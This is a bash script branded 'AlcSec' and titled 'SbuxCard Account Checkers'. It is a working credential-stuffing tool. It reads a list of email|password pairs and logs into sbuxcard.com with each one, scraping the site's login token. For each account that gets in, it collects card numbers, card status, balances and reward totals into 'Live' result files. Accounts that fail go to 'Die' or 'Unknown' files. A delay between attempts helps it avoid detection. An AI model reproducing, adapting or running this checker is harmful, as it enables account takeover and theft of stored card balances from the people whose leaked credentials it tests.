#!/bin/bash
#CODEDBYALCHAPRO AKA ALCHADECODE
#07/10/2018


RED='\033[0;31m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
ORANGE='\033[0;33m'
PUR='\033[0;35m'
GRN="\e[32m"
WHI="\e[37m"
NC='\033[0m'

echo ""
printf "   $WHI ============================================================ \n"
printf "   $GRN#       $RED█████╗ ██╗      ██████╗███████╗███████╗ ██████╗  $GRN	#\n"
printf "   $GRN#       $RED██╔══██╗██║     ██╔════╝██╔════╝██╔════╝██╔════╝ $GRN	#\n"
printf "   $GRN#       $RED███████║██║     ██║     ███████╗█████╗  ██║  $GRN	#\n"     
printf "   $GRN#       $RED██╔══██║██║     ██║     ╚════██║██╔══╝  ██║  $GRN	#\n"     
printf "   $GRN#       $RED██║  ██║███████╗╚██████╗███████║███████╗╚██████╗ $GRN	#\n"
printf "   $GRN#       $RED╚═╝  ╚═╝╚══════╝ ╚═════╝╚══════╝╚══════╝ ╚═════╝ $GRN	#\n"
printf "   $WHI ------------------------------------------------------------ \n"
printf "   $YELLOW		     SbuxCard Account Checkers				\n"
printf "\n"
printf "   $YELLOW		   	  -AlchaDecode-				\n"
printf "   $WHI ============================================================ \n"
printf "$NC\n"


# Asking user whenever the
# parameter is blank or null
  # Print available file on
  # current folder
  # clear
  read -p "Show Directory Tree(Y/n): " show
  if [[ ${show,,} == 'y' ]]; then
  echo ""
  tree
  echo ""
  fi
  read -p "Enter mailist file: " inputFile
  if [[ ! $inputFile ]]; then
  printf "$YELLOW Please input the file \n"
  exit
  fi
  if [ ! -e $inputFile ]; then
  printf "$YELLOW File not found \n"
  exit
  fi
  
  if [[ $targetFolder == '' ]]; then
  read -p "Enter target folder: " targetFolder
  # Check if result folder exists
  # then create if it didn't
  if [[ ! $targetFolder ]]; then
  echo "Creating Hasil/ folder"
    mkdir Hasil
    targetFolder="Hasil"
  fi
  if [[ ! -d "$targetFolder" ]]; then
    echo "Creating $targetFolder/ folder"
    mkdir $targetFolder
  else
    read -p "$targetFolder/ folder exists, append to them?(Y/n): " isAppend
    if [[ $isAppend == 'n' ]]; then
    printf "$YELLOW == Thanks For Using AlcSec == \n"
      exit
    fi
  fi
else
  if [[ ! -d "$targetFolder" ]]; then
    echo "Creating $targetFolder/ folder"
    mkdir $targetFolder
  fi
fi
  read -p "Delay time(Default 15s): " perSec
  if [[ $perSec="" ]]; then
		perSec=15
  fi
totalLines=`grep -c "@" $inputFile`
con=1
printf "$CYAN=================================\n"
printf "$YELLOW       CHECKING PROCESS\n"
printf "$CYAN=================================\n"
check(){
time=$5;
header="`date +%H:%M:%S`"
curlpage=`curl -s -c cookies.txt 'https://www.sbuxcard.com/index.php?page=signin' -H 'Connection: keep-alive' -H 'Cache-Control: max-age=0' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H 'Accept-Encoding: gzip, deflate, br' -H 'Accept-Language: en-US,en;q=0.9' --compressed`
token=$(echo $curlpage | grep '<input type="hidden" name="token" value="' | grep -Po '(?<=type="hidden" name="token" value=")[^"]*');
mashook=`curl -s -b cookies.txt -c ncookies.txt 'https://www.sbuxcard.com/index.php?page=signin' -H 'Connection: keep-alive' -H 'Cache-Control: max-age=0' -H 'Origin: https://www.sbuxcard.com' -H 'Upgrade-Insecure-Requests: 1' -H 'Content-Type: application/x-www-form-urlencoded' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H 'Referer: https://www.sbuxcard.com/index.php?page=signin' -H 'Accept-Encoding: gzip, deflate, br' -H 'Accept-Language: en-US,en;q=0.9'  --data 'token='$token'&Email='$1'&Password='$2'&txtaction=signin&emailcount='$3'&passcount='$4'' --compressed -D - -s -o condition.txt`

rm cookies.txt

if grep -q "index.php?page=account" condition.txt; then

rm condition.txt

    page=$(curl -s -b ncookies.txt 'https://www.sbuxcard.com/index.php?page=cards' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H 'Referer: https://www.sbuxcard.com/index.php?page=account' -H 'Accept-Encoding: gzip, deflate, br' -H 'Accept-Language: en-US,en;q=0.9' --compressed)
    
    pageR=$(curl -s -b ncookies.txt 'https://www.sbuxcard.com/index.php?page=rewards' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H 'Referer: https://www.sbuxcard.com/index.php?page=account' -H 'Accept-Encoding: gzip, deflate, br' -H 'Accept-Language: en-US,en;q=0.9' --compressed)
    
    
    aid=$(echo $page | grep '=&data=');
    ajax=$(echo $aid | grep -Po '(?<=ajax=)[^&]*');
    ajax=$(echo $ajax | cut -d " " -f 1)
    
    cardlist=$(echo $page | grep -Po '(<div id="(.*?)" class="card-list)');
    cardid=$(echo $cardlist | grep -Po '(?<=id="e)[^"]*');
    a=($(echo $cardid | tr ' ' '\n'))

    total=$(echo $page | grep "My Card(s)" | grep -Po '(?<=<h2 class="mc-title">My Card(s) | Total: )[^<]*');
   
   numb=${#a[@]}
   
   CardArr=()
   
for (( i=0; i<$numb; i++)); do

    card=$(curl -s -b ncookies.txt 'https://www.sbuxcard.com/ajaxController.php?ajax='$ajax'&data='e${a[$i]}'&_=1527158116120' -H 'X-NewRelic-ID: UQcHU15WGwcHV1JXDgU=' -H 'Accept-Encoding: gzip, deflate, br' -H 'Accept-Language: en-US,en;q=0.9' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36' -H 'Accept: */*' -H 'Referer: https://www.sbuxcard.com/index.php?page=cards' -H 'X-Requested-With: XMLHttpRequest' -H 'Connection: keep-alive' --compressed)
    
    cnum=$(echo $card | grep -Po '(?<=Card Number<\/strong><\/td><td>: )[^<]*');
    status=$(echo $card | grep -Po '(?<=<font color="#009933">)[^<]*');
    balance=$(echo $card | grep '<span id="cbal">
    								<font color="' | grep -Po '(?<=<font color="#009933"> )[^<]*');
    								
    if [[ ! $status ]];then
    status='Deactive';
    fi
    if [[ ! $balance ]];then
    balance=0;
    fi
    CardArr+="($cnum-$status-$balance)"
    
done 
        echo ${CardArr[@]}
        echo "$email|$pass | $total |${CardArr[@]}" >> $6/ResultSbuxLive.tmp;
        printf "$GRN $total $CYAN[$header] $NC[ ./Alchmst] \n";
		sleep $time
elif grep -q "index.php?page=signin" condition.txt; then
        printf "$RED DIE $CYAN[$header] $NC [ ./Alchmst] \n";
        echo "[DIE] $email|$pass">> $6/ResultSbuxDie.tmp
		sleep $time
else
        printf "$RED UNKNOWN $CYAN[$header] $NC [ ./Alchmst] ";
		echo "[UNKNOWN] $email|$pass">> $6/ResultSbuxUnknown.tmp
		sleep $time
fi
}

SECONDS=0
for mailpass in $(cat $inputFile); do
	email=$(echo $mailpass | cut -d "|" -f 1)
	pass=$(echo $mailpass | cut -d "|" -f 2)
	jmail=${#email}
	jpass=${#pass}
	indexer=$((con++))
	printf "$CYAN $totalLines/$indexer $NC $email|$pass - "
	check $email $pass $jmail $jpass $perSec $targetFolder
done
if [[ -e $targetFolder/ResultSbuxUnknown.tmp ]]; then
for empas in $(cat $targetFolder/ResultSbuxUnknown.tmp); do
email=$(echo $mailpass | cut -d "|" -f 1)
	pass=$(echo $mailpass | cut -d "|" -f 2)
	jmail=${#email}
	jpass=${#pass}
	indexer=$((con++))
	printf "$CYAN $totalLines/$indexer $NC $email|$pass - "
	check $email $pass $jmail $jpass $perSec $targetFolder
done
fi
duration=$SECONDS
printf "$YELLOW $(($duration / 3600)) hours $(($duration / 60)) minutes and $(($duration % 60)) seconds elapsed. \n"
printf "$YELLOW=============== AlcSec - AlchaDecode =============== \n"
